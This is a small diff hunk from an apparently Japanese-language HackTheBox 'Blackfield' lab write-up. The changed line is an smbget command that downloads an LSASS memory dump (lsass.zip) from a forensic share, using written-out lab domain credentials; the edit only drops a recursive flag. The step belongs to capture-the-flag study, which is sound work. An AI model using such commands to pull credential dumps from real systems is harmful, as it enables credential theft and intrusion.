@@ -215,7 +215,7 @@ smb: \memory_analysis\> ls
 ```
 lsassをダウンロード、めっちゃ時間かかった
 ```sh
-└─$ smbget --recursive -U 'blackfield.local/audit2020%#00^BlackKnight' smb://10.129.194.101/forensic/memory_analysis/lsass.zip
+└─$ smbget -U 'blackfield.local/audit2020%#00^BlackKnight' smb://10.129.194.101/forensic/memory_analysis/lsass.zip
 Using domain: BLACKFIELD.LOCAL, user: audit2020
 Using domain: BLACKFIELD.LOCAL, user: audit2020
 smb://10.129.194.101/forensic/memory_analysis/lsass.zip
